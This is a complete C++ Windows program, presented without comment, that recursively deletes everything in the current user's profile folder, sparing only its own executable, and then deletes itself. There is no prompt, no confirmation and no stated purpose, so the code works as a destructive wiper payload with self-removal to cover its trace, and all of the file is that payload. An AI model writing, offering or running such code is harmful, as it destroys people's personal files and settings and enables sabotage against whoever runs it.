#include <Windows.h>
#include <Shlobj.h> // For SHGetFolderPath
#include <iostream>
#include <string>
#include <filesystem>

namespace fs = std::filesystem;

void DeleteFilesAndDirs(const fs::path& path, const fs::path& excludePath) {
    for (const auto& entry : fs::directory_iterator(path)) {
        if (fs::is_directory(entry.status())) {
            DeleteFilesAndDirs(entry.path(), excludePath);
        }

        if (entry.path() != excludePath) {
            fs::remove_all(entry.path());
        }
    }
}

int main() {
    // Get the current user profile directory
    wchar_t userProfile[256];
    SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, userProfile);

    // Get the current executable's path
    wchar_t exePath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH);

    // Convert to filesystem path for easier comparison
    fs::path exeFsPath(exePath);

    try {
        DeleteFilesAndDirs(userProfile, exeFsPath);
    }
    catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }

    // Delete the executable itself
    try {
        fs::remove(exeFsPath);
    }
    catch (const std::exception& e) {
        std::cerr << "Error deleting self: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}
